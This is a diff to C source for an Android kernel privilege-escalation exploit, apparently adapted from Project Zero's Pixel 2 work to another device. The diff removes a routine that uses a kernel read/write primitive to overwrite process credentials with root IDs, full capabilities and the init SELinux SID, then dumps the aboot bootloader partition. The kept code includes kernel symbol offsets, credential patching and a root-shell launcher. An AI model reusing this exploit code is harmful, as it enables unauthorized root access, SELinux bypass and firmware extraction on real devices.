@@ -163,8 +163,13 @@ struct task_security_struct {
 } __attribute__((packed)); /* size: 24 */
 
 /* Kernel symbol table offsets, relative to _head, in the QP1A.190711.020
- * walleye/taimen kernel. The SELinux-related offsets were determined with
- * reference to System.map and a minor bit of trial-and-error.
+ * walleye/taimen (Pixel 2) kernel. The SELinux-related offsets were determined
+ * with reference to System.map and a minor bit of trial-and-error.
+ *
+ * NOTE: these are the upstream Project Zero (Pixel 2) values and do NOT match
+ * any other build. Running on a different device/kernel -- e.g. the MSM8953 /
+ * Android 8.1 device this was studied on -- requires re-deriving every offset
+ * below, and the struct-layout offsets above, from that build's own symbols.
  */
 const ptrdiff_t ksym_init_task = 0x20257d0;
 const ptrdiff_t ksym_init_user_ns = 0x202f2c8;
@@ -202,9 +207,7 @@ void find_current(void);
 void obtain_kernel_rw(void);
 void scan_dynamic_creds(void);
 void scan_init_sid(void);
-void dump_aboot_via_child(void);
 void temporary_root_shell(const char *command);
-void patch_dynamic_creds_and_dump_aboot(void);
 void find_kernel_base(void);
 void patch_creds(void);
 void launch_shell(void);
@@ -467,144 +470,6 @@ static void publish_state(struct dump_shared *shared, int state) {
     __sync_synchronize();
 }
 
-static void wait_state(struct dump_shared *shared, int state) {
-    while (shared->state != state && shared->state >= 0)
-        sched_yield();
-}
-
-static void dump_child(struct dump_shared *shared) {
-    const char *src_path = "/dev/block/mmcblk0p19";
-    const char *dst_path = "/data/local/tmp/aboot.img";
-    const size_t expected = 0x100000;
-    int dst = open(dst_path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0644);
-    u8 *image = malloc(expected);
-    if (dst < 0 || !image) {
-        shared->error_stage = 1;
-        shared->error_no = errno;
-        publish_state(shared, -1);
-        _exit(1);
-    }
-    publish_state(shared, 1); /* destination ready under shell cred */
-    wait_state(shared, 2);    /* parent installed init cred */
-
-    shared->observed_uid = (u32)getuid();
-    shared->observed_gid = (u32)getgid();
-    int src = open(src_path, O_RDONLY | O_CLOEXEC);
-    if (src < 0) {
-        shared->error_stage = 2;
-        shared->error_no = errno;
-        publish_state(shared, -1);
-        while (shared->state != 6)
-            sched_yield();
-        _exit(2);
-    }
-    size_t total = 0;
-    while (total < expected) {
-        size_t want = expected - total;
-        if (want > 0x10000)
-            want = 0x10000;
-        ssize_t nr = read(src, image + total, want);
-        if (nr <= 0) {
-            shared->error_stage = 3;
-            shared->error_no = errno;
-            publish_state(shared, -1);
-            while (shared->state != 6)
-                sched_yield();
-            _exit(3);
-        }
-        total += (size_t)nr;
-    }
-    close(src);
-    shared->bytes = total;
-    publish_state(shared, 3); /* block read complete; request cred restore */
-    wait_state(shared, 4);    /* parent restored shell cred */
-
-    total = 0;
-    while (total < expected) {
-        ssize_t nw = write(dst, image + total, expected - total);
-        if (nw <= 0) {
-            shared->error_stage = 4;
-            shared->error_no = errno;
-            publish_state(shared, -1);
-            while (shared->state != 6)
-                sched_yield();
-            _exit(4);
-        }
-        total += (size_t)nw;
-    }
-    fsync(dst);
-    close(dst);
-    free(image);
-    shared->bytes = total;
-    publish_state(shared, 5); /* file write complete */
-    wait_state(shared, 6);
-    _exit(0);
-}
-
-void dump_aboot_via_child(void) {
-    struct dump_shared *shared = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
-        MAP_SHARED | MAP_ANONYMOUS, -1, 0);
-    if (shared == MAP_FAILED)
-        err(1, "shared dump state mmap");
-    memset(shared, 0, PAGE_SIZE);
-
-    pid_t child = fork();
-    if (child < 0)
-        err(1, "fork dump child");
-    if (child == 0)
-        dump_child(shared);
-    wait_state(shared, 1);
-    if (shared->state < 0)
-        errx(1, "dump child setup failed stage=%d errno=%d",
-             shared->error_stage, shared->error_no);
-
-    execute_stage(2); /* parent obtains kernel R/W; child retains USER_DS */
-    scan_init_sid();
-    u64 child_task = find_task_by_pid((u32)child);
-    if (!child_task)
-        errx(1, "dump child task_struct not found");
-    u64 child_creds[2];
-    kread(child_task + dynamic_cred_task_off, child_creds, sizeof(child_creds));
-    if (child_creds[0] != child_creds[1] || !canonical_ptr(child_creds[0]))
-        errx(1, "dump child cred pair invalid");
-    printf("[+] child task=0x%016lx old_cred=0x%016lx init_cred=0x%016lx\n",
-           child_task, child_creds[0], dynamic_init_cred);
-
-    u64 init_pair[2] = {dynamic_init_cred, dynamic_init_cred};
-    kwrite(child_task + dynamic_cred_task_off, init_pair, sizeof(init_pair));
-    publish_state(shared, 2);
-    while (shared->state == 2)
-        sched_yield();
-
-    /* Restore the child's exact original cred pointers before allowing file
-     * output or process exit. */
-    kwrite(child_task + dynamic_cred_task_off, child_creds, sizeof(child_creds));
-    if (shared->state < 0) {
-        printf("[-] child block stage failed: stage=%d errno=%d uid=%u gid=%u\n",
-               shared->error_stage, shared->error_no,
-               shared->observed_uid, shared->observed_gid);
-        publish_state(shared, 6);
-        waitpid(child, NULL, 0);
-        errx(1, "child block read failed");
-    }
-    printf("[+] child read %lu bytes as uid=%u gid=%u\n", shared->bytes,
-           shared->observed_uid, shared->observed_gid);
-    publish_state(shared, 4);
-    while (shared->state == 4)
-        sched_yield();
-    if (shared->state < 0) {
-        printf("[-] child file stage failed: stage=%d errno=%d\n",
-               shared->error_stage, shared->error_no);
-        publish_state(shared, 6);
-        waitpid(child, NULL, 0);
-        errx(1, "child file write failed");
-    }
-    printf("[+] child wrote %lu bytes\n", shared->bytes);
-    publish_state(shared, 6);
-    waitpid(child, NULL, 0);
-    munmap(shared, PAGE_SIZE);
-}
-
 static void root_child(struct root_shared *shared) {
     signal(SIGINT, root_stop_handler);
     signal(SIGTERM, root_stop_handler);
@@ -715,96 +580,6 @@ void temporary_root_shell(const char *command) {
     waitpid(child, NULL, 0);
     munmap(shared, PAGE_SIZE);
     stage_desc = NULL;
-}
-
-void patch_dynamic_creds_and_dump_aboot(void) {
-    const char *src_path = "/dev/block/mmcblk0p19";
-    const char *dst_path = "/data/local/tmp/aboot.img";
-    const size_t expected = 0x100000;
-
-    /* Create the destination while still in the shell SELinux domain. The
-     * later kernel-domain context may not be permitted to create a
-     * shell_data_file, but can continue using this already-open descriptor. */
-    int dst = open(dst_path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0644);
-    if (dst < 0)
-        err(1, "create aboot image before credential patch");
-    u8 *image = malloc(expected);
-    if (!image)
-        err(1, "allocate aboot image buffer");
-
-    scan_init_sid();
-    if (!dynamic_cred || !dynamic_security || !dynamic_init_sid)
-        errx(1, "validated cred/security/init SID unavailable");
-    prctl(PR_SET_NAME, "cred-found");
-
-    /* struct cred layout was validated above by the eight ID fields and the
-     * task_security_struct signature. These offsets match this kernel at
-     * runtime; no kernel symbol or KASLR offset is used here. */
-    for (size_t off = 4; off <= 32; off += 4)
-        kwrite_u32(dynamic_cred + off, 0);
-    kwrite_u32(dynamic_cred + 36, 0); /* securebits */
-    for (size_t off = 40; off <= 72; off += 8)
-        kwrite_u64(dynamic_cred + off, ~(u64)0);
-
-    /* Match PID 1's observed osid/sid (1/init SID) without changing global
-     * selinux_enforcing. */
-    kwrite_u32(dynamic_security + 0, 1);
-    kwrite_u32(dynamic_security + 4, dynamic_init_sid);
-    prctl(PR_SET_NAME, "init-patched");
-
-    printf("[+] patched identity: uid=%u gid=%u\n", getuid(), getgid());
-    if (getuid() != 0 || getgid() != 0)
-        errx(1, "credential patch validation failed");
-
-    int src = open(src_path, O_RDONLY | O_CLOEXEC);
-    if (src < 0) {
-        char fail_name[16];
-        snprintf(fail_name, sizeof(fail_name), "open-errno-%d", errno);
-        prctl(PR_SET_NAME, fail_name);
-        _exit(100 + errno);
-    }
-    prctl(PR_SET_NAME, "aboot-open");
-
-    /* CONFIG_ARM64_VA_BITS=39. With UAO enabled, normal block-device
-     * usercopy must run with USER_DS rather than the KERNEL_DS value used by
-     * the pipe-based kernel R/W primitive. This is deliberately the final
-     * kernel write in this process. */
-    kwrite_u64(current + 8, 0x0000007fffffffffULL);
-    prctl(PR_SET_NAME, "userds-set");
-
-    size_t total = 0;
-    while (total < expected) {
-        size_t want = expected - total;
-        if (want > 0x10000)
-            want = 0x10000;
-        ssize_t nr = read(src, image + total, want);
-        if (nr <= 0)
-            err(1, "read aboot block device at 0x%lx", total);
-        total += (size_t)nr;
-    }
-    close(src);
-    prctl(PR_SET_NAME, "read-done");
-
-    total = 0;
-    while (total < expected) {
-        size_t done = 0;
-        size_t chunk = expected - total;
-        if (chunk > 0x10000)
-            chunk = 0x10000;
-        while (done < chunk) {
-            ssize_t nw = write(dst, image + total + done, chunk - done);
-            if (nw <= 0)
-                err(1, "write aboot image at 0x%lx", total + done);
-            done += (size_t)nw;
-        }
-        total += chunk;
-    }
-    fsync(dst);
-    close(dst);
-    free(image);
-    prctl(PR_SET_NAME, "write-done");
-
-    printf("[+] dumped %lu bytes from %s to %s\n", total, src_path, dst_path);
 }
 
 void kwrite(u64 kaddr, void *buf, size_t len) {
@@ -1318,7 +1093,6 @@ int main(int argc, char *argv[]) {
     int probing = argc == 2 && !strcmp(argv[1], "probe");
     int scanning = argc == 2 && !strcmp(argv[1], "scan");
     int scanning_init = argc == 2 && !strcmp(argv[1], "scan-init");
-    int dumping = argc == 2 && !strcmp(argv[1], "dump-aboot");
     int root_shell = argc == 2 && !strcmp(argv[1], "root-shell");
     int root_command = argc >= 3 && !strcmp(argv[1], "root-command");
 
@@ -1329,10 +1103,6 @@ int main(int argc, char *argv[]) {
     if ((current & 0xffff000000000000ULL) != 0xffff000000000000ULL)
         errx(1, "leaked current pointer is not canonical: 0x%016lx", current);
     printf("[i] current task_struct candidate: 0x%016lx\n", current);
-    if (dumping) {
-        dump_aboot_via_child();
-        return 0;
-    }
     if (root_shell || root_command) {
         temporary_root_shell(root_command ? argv[2] : NULL);
         return 0;
